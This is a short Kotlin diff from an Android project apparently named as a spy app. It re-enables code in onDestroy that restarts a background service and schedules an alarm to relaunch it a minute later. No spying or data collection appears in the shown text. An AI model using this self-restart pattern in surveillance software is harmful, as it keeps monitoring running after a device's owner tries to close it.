@@ -1,11 +1,11 @@
 package com.komnacki.androidspyapp
 
-import android.content.ComponentName
-import android.content.Context
-import android.content.DialogInterface
-import android.content.SharedPreferences
+import android.app.AlarmManager
+import android.app.PendingIntent
+import android.content.*
 import android.content.pm.PackageManager
 import android.os.Bundle
+import android.os.SystemClock
 import android.text.Editable
 import android.text.TextWatcher
 import android.util.Log
@@ -151,23 +151,23 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
-//        startService(Intent(this, MainService::class.java))
-//        val restartService =
-//            Intent(applicationContext, ServiceReceiver::class.java)
-//        restartService.action = Intent.ACTION_DEFAULT
-//
-//        val pendingIntent = PendingIntent.getBroadcast(
-//            applicationContext,
-//            1,
-//            restartService,
-//            PendingIntent.FLAG_ONE_SHOT
-//        )
-//        val alarmManager =
-//            getSystemService(Context.ALARM_SERVICE) as AlarmManager
-//        alarmManager.set(
-//            AlarmManager.ELAPSED_REALTIME,
-//            SystemClock.elapsedRealtime() + 5 * 1000, pendingIntent
-//        )
+        startService(Intent(this, MainService::class.java))
+        val restartService =
+            Intent(applicationContext, ServiceReceiver::class.java)
+        restartService.action = Intent.ACTION_DEFAULT
+
+        val pendingIntent = PendingIntent.getBroadcast(
+            applicationContext,
+            1,
+            restartService,
+            PendingIntent.FLAG_ONE_SHOT
+        )
+        val alarmManager =
+            getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        alarmManager.set(
+            AlarmManager.ELAPSED_REALTIME,
+            SystemClock.elapsedRealtime() + 60 * 1000, pendingIntent
+        )
         Log.d("KK:", "onDestroy main activity!")
     }
 
